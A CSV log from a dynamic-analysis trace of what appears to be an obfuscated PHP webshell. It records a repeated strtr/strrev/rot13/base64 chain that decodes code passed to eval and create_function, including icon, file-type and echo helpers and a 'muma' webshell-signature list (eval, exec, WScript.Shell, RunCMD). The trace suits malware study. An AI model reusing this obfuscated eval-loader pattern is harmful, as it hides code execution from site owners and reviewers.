uuid,file_md5,index,source,target,argc,argv,return,dynamic
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,254,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gY3NzX2ltZygkaW1nKXsNCgkkaW1hZ2VzID0gYXJyYXkoDQoJImV4ZSI9Pg0KCSJSMGxHT0RsaEV3QU9BS0lBQUFBQUFQLy8vd0FBdmNiR3hvU0VoUC8vL3""]]}","{""value"": ""function css_img($img){\r\n\t$images = array(\r\n\t\""exe\""=>\r\n\t\""R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAA""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,255,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function css_img($img){\r\n\t$images = array(\r\n\t\""exe\""=>\r\n\t\""R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAA""]]}","{""value"": ""\\x00lambda_3""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,256,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function css_img($img){\r\n\t$images = array(\r\n\t\""exe\""=>\r\n\t\""R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7\"".\r\n\t\""WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt\"".\r\n\t\""xhIAOw==\"",\r\n\t\""dir\""=>\""R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA\"".\r\n\t\""AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE\"".\r\n\t\""oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\"",\r\n\t\""txt\""=>\r\n\t\""R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ\"".\r\n\t\""SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7\"".\r\n\t\""UpPWG3Ig6Hq/XmRjuZwkAAA7\"",\r\n\t\""html\""=>\r\n\t\""R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz\"".\r\n\t\""c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P\"".\r\n\t\""KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk\"".\r\n\t\""Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR\"".\r\n\t\""ADs=\"",\r\n\t\""js\""=>\r\n\t\""R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH\"".\r\n\t\""k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs\"".\r\n\t\""a00AjYYBbc/o9HjNniUAADs=\"",\r\n\t\""xml\""=>\r\n\t\""R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA\"".\r\n\t\""gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n\t\""AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx\"".\r\n\t\""OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ\"".\r\n\t\""IQA7\"",\r\n\t\""mp3\""=>\r\n\t\""R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU\"".\r\n\t\""aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc\"".\r\n\t\""IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=\"",\r\n\t\""img\""=>\r\n\t\""R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA\"".\r\n\t\""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci\"".\r\n\t\""Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd\"".\r\n\t\""FxEAOw==\"",\r\n\t\""title\""=>\""R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+\"".\r\n\t\""mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n\t\""ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL\"".\r\n\t\""I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7\"",\r\n\t\""rar\""=>\""R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/\"".\r\n    \""/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b\"".\r\n    \""OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC\"".\r\n    \""aNOmRcjVj02tPxPCzfkvIAA7\""\r\n\t);\r\n  header('Content-type: image/gif');\r\n  echo base64_decode($images[$img]);\r\n  die();\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,257,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,258,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""==DsX0DsWbDQ7fJLyWaL7pPq4E3Wt4zp1EKMlOvB0kJquMJMxyNVtbDQ7fJLyWaL7pvpuW3Wt4zp1EKMlOvBv82pcWPVyAKLwcwVjyzrvNFMmS2LtbwV6qzYvNFMmS2Ltb""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,259,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,260,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,261,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,262,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,263,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,264,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,265,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,266,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,267,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,268,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,269,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0DsWbDQ7fJLyWaL7pPq4E3Wt4zp1EKMlOvB0kJquMJMxyNVtbDQ7fJLyWaL7pvpuW3Wt4zp1EKMlOvBv82pcWPVyAKLwcwVjyzrvNFMmS2LtbwV6qzYvNFMmS2Ltb""]]}","{""value"": ""MaIhL3Eco24tL3AmK3Abo3qcoJpbWTMcoTHcrj0XPFEcqQ1mqJWmqUVbWTMcoTHfYGZcBj0XPKA3nKEwnPtxnKDcrj0XPDywLKAyVPWdpTpvBvOwLKAyVPWanJLvBvOwLK""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,270,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tL3AmK3Abo3qcoJpbWTMcoTHcrj0XPFEcqQ1mqJWmqUVbWTMcoTHfYGZcBj0XPKA3nKEwnPtxnKDcrj0XPDywLKAyVPWdpTpvBvOwLKAyVPWanJLvBvOwLK""]]}","{""value"": ""ZnVuY3Rpb24gY3NzX3Nob3dpbWcoJGZpbGUpew0KCSRpdD1zdWJzdHIoJGZpbGUsLTMpOw0KCXN3aXRjaCgkaXQpew0KCQljYXNlICJqcGciOiBjYXNlICJnaWYiOiBjYX""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,271,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gY3NzX3Nob3dpbWcoJGZpbGUpew0KCSRpdD1zdWJzdHIoJGZpbGUsLTMpOw0KCXN3aXRjaCgkaXQpew0KCQljYXNlICJqcGciOiBjYXNlICJnaWYiOiBjYX""]]}","{""value"": ""function css_showimg($file){\r\n\t$it=substr($file,-3);\r\n\tswitch($it){\r\n\t\tcase \""jpg\"": case \""gif\"": case \""bmp\"": case \""png\"": case \""ico\"":""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,272,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function css_showimg($file){\r\n\t$it=substr($file,-3);\r\n\tswitch($it){\r\n\t\tcase \""jpg\"": case \""gif\"": case \""bmp\"": case \""png\"": case \""ico\"":""]]}","{""value"": ""\\x00lambda_4""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,273,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function css_showimg($file){\r\n\t$it=substr($file,-3);\r\n\tswitch($it){\r\n\t\tcase \""jpg\"": case \""gif\"": case \""bmp\"": case \""png\"": case \""ico\"": return 'img';break;\r\n\t\tcase \""htm\"": case \""tml\"": return 'html';break;\r\n\t\tcase \""exe\"": case \""com\"": return 'exe';break;\r\n\t\tcase \""xml\"": case \""doc\"": return 'xml';break;\r\n\t\tcase \"".js\"": case \""vbs\"": return 'js';break;\r\n\t\tcase \""mp3\"": case \""wma\"": case \""wav\"": case \""swf\"": case \"".rm\"": case \""avi\"":case \""mp4\"":case \""mvb\"": return 'mp3';break;\r\n\t\tcase \""rar\"": case \""tar\"": case \"".gz\"": case \""zip\"":case \""iso\"": return 'rar';break;\r\n  \tdefault: return 'txt';break;\r\n\t}\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,274,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,275,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""=0aPAfwVhkIL0STMxVPViu2LyytPAfKXuEKLxEPXh9SogEUnt42ocE3LhIaM""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,276,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,277,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,278,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,279,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,280,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,281,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,282,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,283,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,284,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,285,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,286,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""=0aPAfwVhkIL0STMxVPViu2LyytPAfKXuEKLxEPXh9SogEUnt42ocE3LhIaM""]]}","{""value"": ""MaIhL3Eco24tnUEgoS9hXPExLKEuXKfAPtyyL2uiVPVxMTS0LIkhVwfAPa0=""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,287,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tnUEgoS9hXPExLKEuXKfAPtyyL2uiVPVxMTS0LIkhVwfAPa0=""]]}","{""value"": ""ZnVuY3Rpb24gaHRtbF9uKCRkYXRhKXsNCgllY2hvICIkZGF0YVxuIjsNCn0=""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,288,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gaHRtbF9uKCRkYXRhKXsNCgllY2hvICIkZGF0YVxuIjsNCn0=""]]}","{""value"": ""function html_n($data){\r\n\techo \""$data\\n\"";\r\n}""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,289,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function html_n($data){\r\n\techo \""$data\\n\"";\r\n}""]]}","{""value"": ""\\x00lambda_5""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,290,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function html_n($data){\r\n\techo \""$data\\n\"";\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,291,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,292,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""==DsX0DsWbDQ7HJqlEUVhWKq0IzptxFXyE2owEPYyE2owITocMTWbVUqmyzp0AUXzyJPWbDQ7yFMx92LxNlpuOFKyOKr0ITocMTWo1JnxEPXbAJLyW3ozytPAfGXWbDQcV""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,293,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,294,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,295,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,296,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,297,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,298,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,299,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,300,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,301,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,302,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,303,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0DsWbDQ7HJqlEUVhWKq0IzptxFXyE2owEPYyE2owITocMTWbVUqmyzp0AUXzyJPWbDQ7yFMx92LxNlpuOFKyOKr0ITocMTWo1JnxEPXbAJLyW3ozytPAfGXWbDQcV""]]}","{""value"": ""MaIhL3Eco24toKIgLFtxMzyfMJAiMTHfWTMcoTI0rKOyXKfAPtxxMTygVQ0tLKWlLKxbQDbWVaObpPVtCG4tLKWlLKxbVzI2LJjbVvjvMKuyLltvXFjAPtxvLKAjVvN9Cv""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,304,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24toKIgLFtxMzyfMJAiMTHfWTMcoTI0rKOyXKfAPtxxMTygVQ0tLKWlLKxbQDbWVaObpPVtCG4tLKWlLKxbVzI2LJjbVvjvMKuyLltvXFjAPtxvLKAjVvN9Cv""]]}","{""value"": ""ZnVuY3Rpb24gbXVtYSgkZmlsZWNvZGUsJGZpbGV0eXBlKXsNCgkkZGltID0gYXJyYXkoDQoJInBocCIgPT4gYXJyYXkoImV2YWwoIiwiZXhlYygiKSwNCgkiYXNwIiA9Pi""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,305,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gbXVtYSgkZmlsZWNvZGUsJGZpbGV0eXBlKXsNCgkkZGltID0gYXJyYXkoDQoJInBocCIgPT4gYXJyYXkoImV2YWwoIiwiZXhlYygiKSwNCgkiYXNwIiA9Pi""]]}","{""value"": ""function muma($filecode,$filetype){\r\n\t$dim = array(\r\n\t\""php\"" => array(\""eval(\"",\""exec(\""),\r\n\t\""asp\"" => array(\""WScript.Shell\"",\""execute(\""""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,306,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function muma($filecode,$filetype){\r\n\t$dim = array(\r\n\t\""php\"" => array(\""eval(\"",\""exec(\""),\r\n\t\""asp\"" => array(\""WScript.Shell\"",\""execute(\""""]]}","{""value"": ""\\x00lambda_6""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,307,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function muma($filecode,$filetype){\r\n\t$dim = array(\r\n\t\""php\"" => array(\""eval(\"",\""exec(\""),\r\n\t\""asp\"" => array(\""WScript.Shell\"",\""execute(\"",\""createtextfile(\""),\r\n\t\""aspx\"" => array(\""Response.Write(eval(\"",\""RunCMD(\"",\""CreateText()\""),\r\n\t\""jsp\"" => array(\""runtime.exec(\"")\r\n\t);\r\n\tforeach($dim[$filetype] as $code){\r\n\t\tif(stristr($filecode,$code)) return true;\r\n\t}\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,308,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,309,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""==DsX0DsWbDQ7HJqlEUVhWKq0IzpWxFXcEPYykJnzEPXlE3pcWUqmuvMcyDPX0jrcxTWtZKLtHTp5EUWbt2LuIzpiMJPX0jBcHTp5EaMxjlW8qPXyE2ofOUry1GMjyUqxx""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
